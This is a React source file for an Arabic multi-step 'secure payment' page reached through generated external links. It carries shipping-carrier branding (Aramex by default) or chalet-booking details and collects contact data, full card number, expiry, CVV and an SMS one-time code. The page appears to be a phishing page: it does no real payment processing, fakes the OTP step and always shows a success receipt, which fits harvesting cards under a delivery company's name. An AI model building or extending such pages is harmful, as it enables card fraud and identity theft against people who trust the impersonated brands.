import React, { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { useExternalLink } from "@/hooks/useExternalLinks";
import { getCountryByCode, formatCurrency } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { gccShippingServices } from "@/lib/gccShippingServices";
import { CHALETS } from "@/lib/data";
import SEOHead from "@/components/SEOHead";
import {
  CreditCard,
  User,
  Mail,
  Phone,
  MapPin,
  Shield,
  CheckCircle2,
  AlertCircle,
  ArrowLeft
} from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const ExternalPaymentForm = () => {
  const { externalId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: link, isLoading, error } = useExternalLink(externalId);

  // Form states
  const [step, setStep] = useState<'recipient' | 'details' | 'card' | 'otp' | 'receipt'>('recipient');
  const [formData, setFormData] = useState({
    recipientName: '',
    recipientEmail: '',
    recipientPhone: '',
    recipientAddress: '',
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: '',
    otp: ''
  });

  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  if (error || !link) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <AlertCircle className="w-16 h-16 text-destructive mx-auto mb-4" />
          <h2 className="text-2xl font-bold mb-2">الرابط غير موجود</h2>
          <p className="text-muted-foreground mb-4">الرجاء التحقق من الرابط</p>
          <Button onClick={() => navigate('/')}>
            العودة للصفحة الرئيسية
          </Button>
        </div>
      </div>
    );
  }

  const countryData = getCountryByCode(link.countryCode);
  const payload = link.payload;
  const isShipping = link.type === 'shipping';
  const serviceName = payload.service_name || payload.chalet_name;
  const serviceKey = payload.service_key || 'aramex';
  const serviceBranding = getServiceBranding(serviceKey);

  // SEO metadata
  const seoTitle = `دفع - ${link.metadata?.title || serviceName}`;
  const seoDescription = `أكمل عملية الدفع لـ ${serviceName} - نظام دفع آمن ومحمي`;

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
  };

  const handleNext = () => {
    if (step === 'recipient') {
      if (!formData.recipientName || !formData.recipientEmail || !formData.recipientPhone) {
        toast({
          title: "خطأ",
          description: "الرجاء ملء جميع الحقول المطلوبة",
          variant: "destructive",
        });
        return;
      }
      setStep('details');
    } else if (step === 'details') {
      if (!formData.recipientAddress) {
        toast({
          title: "خطأ",
          description: "الرجاء إدخال العنوان",
          variant: "destructive",
        });
        return;
      }
      setStep('card');
    } else if (step === 'card') {
      if (!formData.cardNumber || !formData.cardHolder || !formData.expiryDate || !formData.cvv) {
        toast({
          title: "خطأ",
          description: "الرجاء ملء جميع بيانات البطاقة",
          variant: "destructive",
        });
        return;
      }
      setStep('otp');
    } else if (step === 'otp') {
      if (!formData.otp) {
        toast({
          title: "خطأ",
          description: "الرجاء إدخال رمز التحقق",
          variant: "destructive",
        });
        return;
      }
      setStep('receipt');
    }
  };

  const handleBack = () => {
    if (step === 'details') setStep('recipient');
    else if (step === 'card') setStep('details');
    else if (step === 'otp') setStep('card');
  };

  const renderStepContent = () => {
    switch (step) {
      case 'recipient':
        return (
          <div className="space-y-4">
            <h3 className="text-lg font-bold mb-4">معلومات المستلم</h3>
            
            <div>
              <Label className="mb-2 flex items-center gap-2 text-sm">
                <User className="w-4 h-4" />
                الاسم الكامل *
              </Label>
              <Input
                value={formData.recipientName}
                onChange={(e) => handleInputChange('recipientName', e.target.value)}
                placeholder="الاسم الكامل"
                className="h-10"
                required
              />
            </div>

            <div>
              <Label className="mb-2 flex items-center gap-2 text-sm">
                <Mail className="w-4 h-4" />
                البريد الإلكتروني *
              </Label>
              <Input
                type="email"
                value={formData.recipientEmail}
                onChange={(e) => handleInputChange('recipientEmail', e.target.value)}
                placeholder="example@email.com"
                className="h-10"
                required
              />
            </div>

            <div>
              <Label className="mb-2 flex items-center gap-2 text-sm">
                <Phone className="w-4 h-4" />
                رقم الهاتف *
              </Label>
              <Input
                value={formData.recipientPhone}
                onChange={(e) => handleInputChange('recipientPhone', e.target.value)}
                placeholder="+971 50 123 4567"
                className="h-10"
                required
              />
            </div>
          </div>
        );

      case 'details':
        return (
          <div className="space-y-4">
            <h3 className="text-lg font-bold mb-4">تفاصيل إضافية</h3>
            
            <div>
              <Label className="mb-2 flex items-center gap-2 text-sm">
                <MapPin className="w-4 h-4" />
                العنوان *
              </Label>
              <Input
                value={formData.recipientAddress}
                onChange={(e) => handleInputChange('recipientAddress', e.target.value)}
                placeholder="العنوان الكامل"
                className="h-10"
                required
              />
            </div>

            {/* Service/Chalet Details */}
            <div className="p-4 bg-secondary/20 rounded-lg">
              <h4 className="font-semibold mb-2">تفاصيل {isShipping ? 'الشحنة' : 'الحجز'}</h4>
              {isShipping ? (
                <div className="space-y-2 text-sm">
                  <p><strong>رقم الشحنة:</strong> {payload.tracking_number}</p>
                  <p><strong>خدمة الشحن:</strong> {serviceName}</p>
                  <p><strong>وصف الطرد:</strong> {payload.package_description || 'غير محدد'}</p>
                </div>
              ) : (
                <div className="space-y-2 text-sm">
                  <p><strong>الشاليه:</strong> {payload.chalet_name}</p>
                  <p><strong>عدد الضيوف:</strong> {payload.guest_count}</p>
                  <p><strong>عدد الليالي:</strong> {payload.nights}</p>
                </div>
              )}
            </div>
          </div>
        );

      case 'card':
        return (
          <div className="space-y-4">
            <h3 className="text-lg font-bold mb-4">بيانات البطاقة</h3>
            
            <div>
              <Label className="mb-2 flex items-center gap-2 text-sm">
                <CreditCard className="w-4 h-4" />
                رقم البطاقة *
              </Label>
              <Input
                value={formData.cardNumber}
                onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                placeholder="1234 5678 9012 3456"
                className="h-10"
                required
              />
            </div>

            <div>
              <Label className="mb-2 text-sm">اسم حامل البطاقة *</Label>
              <Input
                value={formData.cardHolder}
                onChange={(e) => handleInputChange('cardHolder', e.target.value)}
                placeholder="الاسم كما هو مكتوب على البطاقة"
                className="h-10"
                required
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <Label className="mb-2 text-sm">تاريخ الانتهاء *</Label>
                <Input
                  value={formData.expiryDate}
                  onChange={(e) => handleInputChange('expiryDate', e.target.value)}
                  placeholder="MM/YY"
                  className="h-10"
                  required
                />
              </div>
              <div>
                <Label className="mb-2 text-sm">CVV *</Label>
                <Input
                  value={formData.cvv}
                  onChange={(e) => handleInputChange('cvv', e.target.value)}
                  placeholder="123"
                  className="h-10"
                  required
                />
              </div>
            </div>
          </div>
        );

      case 'otp':
        return (
          <div className="space-y-4">
            <h3 className="text-lg font-bold mb-4">التحقق من الهوية</h3>
            
            <div className="text-center p-4 bg-secondary/20 rounded-lg">
              <Shield className="w-12 h-12 text-primary mx-auto mb-2" />
              <p className="text-sm text-muted-foreground mb-4">
                تم إرسال رمز التحقق إلى رقم هاتفك
              </p>
            </div>

            <div>
              <Label className="mb-2 text-sm">رمز التحقق *</Label>
              <Input
                value={formData.otp}
                onChange={(e) => handleInputChange('otp', e.target.value)}
                placeholder="1234"
                className="h-10 text-center text-lg"
                maxLength={4}
                required
              />
            </div>
          </div>
        );

      case 'receipt':
        return (
          <div className="space-y-4 text-center">
            <CheckCircle2 className="w-16 h-16 text-green-500 mx-auto mb-4" />
            <h3 className="text-2xl font-bold text-green-600 mb-2">تم الدفع بنجاح!</h3>
            <p className="text-muted-foreground mb-4">
              تم إكمال عملية الدفع بنجاح
            </p>
            
            <div className="p-4 bg-secondary/20 rounded-lg text-right">
              <h4 className="font-semibold mb-2">تفاصيل الدفع</h4>
              <p className="text-sm"><strong>المبلغ:</strong> {formatCurrency(isShipping ? payload.cod_amount : payload.total_amount, countryData?.currency || 'AED')}</p>
              <p className="text-sm"><strong>رقم المرجع:</strong> {link.externalId}</p>
              <p className="text-sm"><strong>التاريخ:</strong> {new Date().toLocaleDateString('ar-SA')}</p>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <>
      <SEOHead 
        title={seoTitle}
        description={seoDescription}
        url={window.location.href}
        type="website"
      />
      <div className="min-h-screen py-8 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
        <div className="container mx-auto px-4">
          <div className="max-w-2xl mx-auto">
            {/* Header */}
            <div className="text-center mb-6">
              <Badge className="text-lg px-6 py-2 bg-gradient-primary mb-4">
                <Shield className="w-4 h-4 ml-2" />
                <span>دفع آمن ومحمي</span>
              </Badge>
              <h1 className="text-2xl font-bold mb-2">
                {isShipping ? `دفع شحنة ${serviceName}` : `حجز ${payload.chalet_name}`}
              </h1>
              <p className="text-muted-foreground">
                {link.metadata?.description || `أكمل عملية الدفع لـ ${serviceName}`}
              </p>
            </div>

            {/* Progress Steps */}
            {step !== 'receipt' && (
              <div className="flex justify-center mb-8">
                <div className="flex items-center space-x-4">
                  {['recipient', 'details', 'card', 'otp'].map((stepName, index) => (
                    <div key={stepName} className="flex items-center">
                      <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${
                        step === stepName ? 'bg-primary text-primary-foreground' :
                        ['recipient', 'details', 'card', 'otp'].indexOf(step) > index ? 'bg-green-500 text-white' :
                        'bg-secondary text-muted-foreground'
                      }`}>
                        {index + 1}
                      </div>
                      {index < 3 && (
                        <div className={`w-8 h-0.5 ${
                          ['recipient', 'details', 'card', 'otp'].indexOf(step) > index ? 'bg-green-500' : 'bg-secondary'
                        }`} />
                      )}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Main Card */}
            <Card className="p-6 shadow-elevated">
              {renderStepContent()}

              {/* Action Buttons */}
              {step !== 'receipt' && (
                <div className="flex justify-between mt-6">
                  {step !== 'recipient' && (
                    <Button variant="outline" onClick={handleBack}>
                      <ArrowLeft className="w-4 h-4 ml-2" />
                      السابق
                    </Button>
                  )}
                  
                  <Button 
                    onClick={handleNext}
                    className={step === 'recipient' ? 'w-full' : ''}
                  >
                    {step === 'otp' ? 'تأكيد الدفع' : 'التالي'}
                  </Button>
                </div>
              )}

              {step === 'receipt' && (
                <div className="mt-6">
                  <Button 
                    onClick={() => navigate('/')}
                    className="w-full"
                  >
                    العودة للصفحة الرئيسية
                  </Button>
                </div>
              )}
            </Card>

            {/* Amount Summary */}
            {step !== 'receipt' && (
              <Card className="mt-4 p-4 bg-gradient-primary text-primary-foreground">
                <div className="text-center">
                  <p className="text-sm opacity-90">المبلغ الإجمالي</p>
                  <p className="text-3xl font-bold">
                    {formatCurrency(isShipping ? payload.cod_amount : payload.total_amount, countryData?.currency || 'AED')}
                  </p>
                </div>
              </Card>
            )}
          </div>
        </div>
      </div>
    </>
  );
};

export default ExternalPaymentForm;